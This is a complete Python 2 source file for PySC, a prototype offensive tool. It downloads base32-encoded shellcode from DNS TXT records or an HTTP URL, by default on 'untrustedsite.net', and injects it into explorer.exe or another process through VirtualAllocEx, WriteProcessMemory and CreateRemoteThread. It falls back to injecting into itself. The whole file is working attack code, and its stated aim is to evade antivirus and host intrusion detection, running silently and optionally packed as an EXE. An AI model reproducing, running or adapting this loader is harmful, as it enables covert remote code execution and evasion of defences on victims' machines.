#!/usr/bin/python
# -*- coding: utf-8 -*-

#

"""
    PySC xpands on the numerous available tools and scripts to inject into a process on a
    running system.

    Aims of this project:

    - Remove shellcode from the script to help avoid detection by AV and HIPS systems
    - Offer a flexible command line based script
    - Also provide the ability to run fully automated  as an EXE (by using pyinstaller)

    To this end this prototype script offers the ability to download shellcode from a
    remote DNS server (using TXT records) or through Internet Explorer (using SSPI to
    utilize system-wide proxy settings and authorization tokens) and injects it into a
    specified process. If injection into the specified process is not possible, the script
    falls back to injecting into the current process.

....Module depenancies: pydns, psutil
"""

from sys import exit, platform, argv
from DNS import DiscoverNameServers, Request
from base64 import b32decode
from psutil import get_process_list
from urlparse import urlparse
from ctypes import *
from ctypes.wintypes import DWORD
from getopt import getopt

__author__ = 'Chris John Riley'
__credits__ = 'Too Many To List'
__license__ = 'GPL'
__version__ = '0.5'
__maintainer__ = 'Chris John Riley'
__email__ = 'contact@c22.cc'
__status__ = 'Prototype'

kernel32 = windll.kernel32
wininet = windll.wininet

process = 'explorer.exe'  # target for injection, exe name or SELF
pid = ''
shellcode = ''
fallback = True  # fallback to injection in current process
dns = 'untrustedsite.net'  # dns for TXT records
check_dns = True
url = 'http://www.untrustedsite.net/POC/shellcode.txt'  # url for SSPI connection
check_url = True
priority = 'dns'  # set priority to dns | url
debug = False  # enable / disable feedback
header = False  # enable / disable header

logo = \
    '''

                                           .d8888b.   .d8888b.
                      8888888b.           d88P  Y88b d88P  Y88b
                      888   Y88b          Y88b.      888    888
                      888    888           "Y888b.   888
                      888   d88P 888  888     "Y88b. 888
                      8888888P"  888  888       "888 888    888
                      888        888  888 Y88b  d88P Y88b  d88P
                      888        Y88b 888  "Y8888P"   "Y8888P"
                      888         "Y88888
                                      888     0101000001111001
                                 Y8b d88P       0101001101000011
                                  "Y88P"

                                      _/ PyShellcode (prototype)
                                               _/ ChrisJohnRiley
                                                  _/ blog.c22.cc
'''

usage = \
    '''Usage:

\t -h / --help   :: Display help (this!)
\t -d / --debug  :: Display debug messages
\t --sc          :: Shellcode to inject (in \\xXX notation)
\t --process     :: Target process.exe or PID
\t --dns         :: DNS to download b32 encoded shellcode
\t --disable_dns :: Disable DNS method
\t --url         :: URL to download b32 encoded shellcode
\t --url_disable :: Disable URL method
\t --priority    :: Set priority to "dns" or "url"

Notes:

 PySC will by default run silent (no user feedback) to enable user
 feedback (error/status messages) please use debug mode (-d/--debug
 at command-line, or set debug = True in the script itself)

 Any command-line options passed to PySC at runtime override the
 hard-coded values within the script.

 To use PySC as a stand-alone executable, set the desired parameters
 in the script itself, and use pyinstaller to create a .exe
'''


def main():
    setup()
    checks()
    shellcode = getsc(priority, dns, check_dns, url, check_url)
    pid = getpid(process)
    inject(shellcode, pid)


def setup():

    # override any hard-coded variables based on command line parameters

    if len(argv) > 1:
        try:
            (opts, args) = getopt(argv[1:], 'h:d', [
                'help',
                'debug',
                'sc=',
                'process=',
                'dns=',
                'disable_dns',
                'url=',
                'disable_url',
                'priority=',
                ])
        except:
            print logo
            print usage
            exit(0)
        for (opt, arg) in opts:
            if opt in ('-h', '--help'):
                print logo
                print usage
                exit(0)
            elif opt in ('-d', '--debug'):
                global debug
                debug = True
            elif opt in '--sc':
                global shellcode
                shellcode = arg.decode('string_escape')
                if debug:
                    print ' [>] Using shellcode provided at command-line'
            elif opt in '--process':
                global process
                global pid
                if arg.endswith('.exe'):
                    process = arg
                elif arg.isdigit():
                    pid = arg
                else:
                    if debug:
                        print ' [!] please specify a valid .exe as process'
                    exit(1)
            elif opt in '--dns':
                global dns
                dns = arg
            elif opt in '--disable_dns':
                global check_dns
                check_dns = False
            elif opt in '--url':
                global url
                if arg.startswith('http'):
                    url = arg
                else:
                    url = 'http://' + arg
            elif opt in '--disable_url':
                global check_url
                check_url = False
            elif opt in '--priority':
                global priority
                if arg == 'dns':
                    priority = 'dns'
                elif arg == 'url':
                    priority = 'url'
                else:
                    if debug:
                        print ' [!] Invalid priorty value, ignoring'

    if header or debug:
        print logo


def checks():

    # check platform and connection if shellcode not provided at command-line

    check_platform()
    if not shellcode:
        check_network()


def check_platform():

    # check target is 'winXX'

    if not platform.startswith('win'):
        if debug:
            print ' [!] Not a Windows system!, exiting'
        exit(1)
    else:
        if debug:
            print ' [>] Windows detected - %s' % platform


def check_network():

    # check network connection

    flags = DWORD()
    if debug:
        print '\n [>] Checking connection'
    connected = wininet.InternetGetConnectedState(
                byref(flags),
                None,
                )

    if not connected:
        if debug:
            print ' [!] No internet connection, cannot retrieve data'
        exit(1)
    else:
        if debug:
            print ' [>] Connection check confirmed'


def getsc(priority, dns, check_dns, url, check_url):

    # perform requests in set order

    if not check_url and not check_dns:
        if debug:
            print ' [!] Must specify at least one source for shellcode'
        exit(1)
    global shellcode
    if not shellcode:
        if priority == 'dns':
            try:
                shellcode = dnsrequest(dns, check_dns)
                if shellcode:
                    return shellcode
                else:
                    raise Exception
            except:
                shellcode = urlrequest(url, check_url)
                if shellcode:
                    return shellcode
                else:
                    if debug:
                        print ' [!] No shellcode found with specified options'
                    exit(1)
        else:
            try:
                shellcode = urlrequest(url, check_url)
                if shellcode:
                    return shellcode
                else:
                    raise Exception
            except:
                shellcode = dnsrequest(dns, check_dns)
                if shellcode:
                    return shellcode
                else:
                    if debug:
                        print ' [!] No shellcode found with specified options'
                    exit(1)
    else:

        # shellcode provided at command-line

        return shellcode


def dnsrequest(dns, check_dns):

    # attempt to retrieve shellcode from remote DNS record (TXT)

    if check_dns:
        if debug:
            print '\n [>] Checking DNS'
        try:

            # set system DNS and make request for TXT records

            type = 'TXT'
            DiscoverNameServers()
            r = Request(qtype=type)
            res = r.req(dns)
            txtvalue = ''

            # for every answer check for shellcode -(starts with SC) and merge into one variable
            # example: text = "SC7TUISAAAABQITZJR2JSIWURQRNJAZC2SCSFX...."

            for each in res.answers:
                ans = each['data'][0]
                if ans.startswith('SC'):
                    for values in each['data']:
                        txtvalue += values

            # check that shellcode is present and decode (base32, skipping intial SC marker)

            if not txtvalue:
                if debug:
                    print ' [!] No shellcode Found withn %s TXT records' % dns
                return
            else:
                try:
                    shellcode = b32decode(txtvalue[2:])
                    if debug:
                        print ' [>] Returning shellcode from %s (%s record)' % (dns, type)
                    return shellcode
                except:
                    if debug:
                        print ' [!] Cannot decode shellcode from DNS (%s)' % dns
                    return
        except:
            return


def urlrequest(url, check_url):

    # attempt to use Internet Explorer (urlmon) to retrieve shellcode from a remote URL

    if check_url:

        INTERNET_OPEN_TYPE_PRECONFIG = 0
        INTERNET_SERVICE_HTTP = 3
        INTERNET_FLAG_RELOAD = 0x80000000
        INTERNET_FLAG_CACHE_IF_NET_FAIL = 0x00010000
        INTERNET_FLAG_NO_CACHE_WRITE = 0x04000000
        INTERNET_FLAG_PRAGMA_NOCACHE = 0x00000100
        HTTP_QUERY_FLAG_NUMBER = 0x20000000
        HTTP_QUERY_STATUS_CODE = 19
        INTERNET_DEFAULT_HTTP_PORT = 80
        INTERNET_DEFAULT_HTTPS_PORT = 443
        dwStatus = DWORD()
        dwBufLen = DWORD(4)
        buff = c_buffer(0x2000)
        bytesRead = DWORD()
        useragent = 'Mozilla/5.0 PySC'
        method = 'GET'
        data = ''

        # parse url into peices for later use

        p_url = urlparse(url)
        path = p_url.path
        netloc = p_url.netloc.split(':')
        conn_user = p_url.username
        conn_pass = p_url.password

        if p_url.port:
            conn_port = p_url.port
        elif p_url.scheme == 'http':
            conn_port = 80
        else:
            conn_port = 443

        if debug:
            print '\n [>] Checking URL'

        try:
            hInternet = wininet.InternetOpenA(
                        useragent,
                        INTERNET_OPEN_TYPE_PRECONFIG,
                        False,
                        False,
                        False,
                        )

            if not hInternet:
                if debug:
                    print ' [!] Unable to build connection to %s' % p_url.geturl()
                raise Exception

            hConnect = wininet.InternetConnectA(
                        hInternet,
                        netloc[0],
                        conn_port,
                        conn_user,
                        conn_pass,
                        INTERNET_SERVICE_HTTP,
                        False,
                        False,
                        )

            if not hConnect:
                if debug:
                    print ' [!] Unable to make connection to %s' % p_url.geturl()
                raise Exception

            hRequest = wininet.HttpOpenRequestA(
                        hConnect,
                        method,
                        path,
                        False,
                        False,
                        False,
                        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | \
                            INTERNET_FLAG_CACHE_IF_NET_FAIL | INTERNET_FLAG_PRAGMA_NOCACHE,
                        False,
                        )

            if not hRequest:
                if debug:
                    print ' [!] Unable to open request to %s' % p_url.geturl()
                raise Exception

            hSendRequest = wininet.HttpSendRequestA(
                            hRequest,
                            False,
                            False,
                            False,
                            False,
                            )

            if not hSendRequest:
                if debug:
                    print ' [!] Unable to send request to %s' % p_url.geturl()
                raise Exception

            hQuery = wininet.HttpQueryInfoA(
                        hRequest,
                        HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
                        byref(dwStatus),
                        byref(dwBufLen),
                        False,
                        )

            if not hQuery:
                if debug:
                    print ' [!] Unable to complete query to %s' % p_url.geturl()
                raise Exception

            if dwStatus.value != 200:
                if debug:
                    print ' [!] Incorrect server response from %s' % p_url.geturl()
                raise Exception

            # conntection ok, read data (limited to buffer size)

            hRead = wininet.InternetReadFile(
                    hRequest,
                    buff,
                    len(buff),
                    byref(bytesRead),
                    )

            if not hRead:
                if debug:
                    print ' [!] Unable to read response from %s' % p_url.geturl()
            else:
                data = data + buff.raw[:bytesRead.value]
                if debug:
                    print ' [>] Reading in response from %s' % p_url.geturl()

            # Extract Shellcode... example response from server provides only base32 encoded string
            # example: text = "SC7TUISAAAABQITZJR2JSIWURQRNJAZC2SCSFX...."

            if data.startswith('SC'):
                datavalue = data
            if not datavalue:
                if debug:
                    print ' [!] No shellcode received from %s' % p_url.geturl()
                return
            else:

                # check that shellcode i can be decoded (base32, skipping intial SC marker)

                try:
                    shellcode = b32decode(datavalue[2:-1])
                    if debug:
                        print ' [>] Returning shellcode from %s' % p_url.geturl()
                    return shellcode
                except:
                    if debug:
                        print ' [!] Cannot decode shellcode from URL (%s)' % p_url.geturl()
                    return
        except:
            if debug:
                print ' [!] Unable to retrieve shellcode from URL (%s)' % p_url.geturl()
            return


def getpid(process):

    # get the pid of the desired process. Default to current process on failure

    global pid
    if not pid:
        if process == 'SELF':
            pid = kernel32.GetCurrentProcessId()
            return pid
        else:
            try:
                procs = get_process_list()
                for proc in procs:
                    if proc.name == process:
                        pid = proc.pid
                        if debug:
                            print ' [>] Process: %s has a PID number of %s' % (process, pid)
                        return pid
                        break
                if not pid:
                        if debug:
                            print ' [!] Process %s not found' % process
                        raise Exception
            except:
                pid = kernel32.GetCurrentProcessId()
                if debug:
                    print ' [!] Cannot find pid of requested process, injecting into current PID'
                return pid
    else:

        # pid set at command-line

        return pid

def inject(shellcode, pid):

    # inject shellcode into the desired target pid

    PAGE_EXECUTE_READWRITE = 0x00000040
    PROCESS_ALL_ACCESS = 0x000F0000 | 0x00100000 | 0xFFF
    VIRTUAL_MEM = 0x1000 | 0x2000

    sc_size = len(shellcode)

    # get a handle to the process we are injecting into

    hProcess = kernel32.OpenProcess(
                PROCESS_ALL_ACCESS,
                False,
                int(pid),
                )

    if not hProcess:
        if debug:
            print "\n [!] Couldn't acquire a handle to PID: %s" % pid

        # try to rescue the situation and inject into current process

        if fallback:
            try:
                if pid != kernel32.GetCurrentProcessId():
                    pid = kernel32.GetCurrentProcessId()
                    hProcess = kernel32.OpenProcess(
                                PROCESS_ALL_ACCESS,
                                False,
                                int(pid),
                                )
                    if debug:
                        print ' [>] Fallback: Injecting into current PID (%s)' % pid
                else:

                    # already failed to get handle to self

                    raise Exception
            except:

                # terminal error

                if debug:
                    print '\n [!] Unrecoverable error'
                exit(1)
        else:
            if debug:
                print ' [!] Fallback disabled: Cannot gain handle to desired process'
            exit(1)
    else:
        if debug:
            print '\n [>] Acquired a handle to PID: %s' % pid

    # allocate some space for the shellcode (in the program memory)

    hAlloc = kernel32.VirtualAllocEx(
                hProcess,
                False,
                sc_size,
                VIRTUAL_MEM,
                PAGE_EXECUTE_READWRITE,
                )

    # write out the shellcode

    written = c_int(0)
    hWrite = kernel32.WriteProcessMemory(
                hProcess,
                hAlloc,
                shellcode,
                sc_size,
                byref(written),
                )

    # now we create the remote thread and point its entry routine to be head of our shellcode

    thread_id = c_ulong(0)
    hCreate = kernel32.CreateRemoteThread(
                hProcess,
                None,
                False,
                hAlloc,
                None,
                False,
                byref(thread_id),
                )
    if hCreate:
        if debug:
            print ' [>] Injection complete. Exiting.'
        exit(0)
    else:
        if pid != kernel32.GetCurrentProcessId():
            if debug:
                print ' [!] Failed to inject shellcode. Defaulting to current process.'
            pid = kernel32.GetCurrentProcessId()
            inject(shellcode, pid)
        else:
            if debug:
                print ' [!] Failed to inject process-killing shellcode. Exiting.'
            exit(1)


if __name__ == '__main__':
    main()
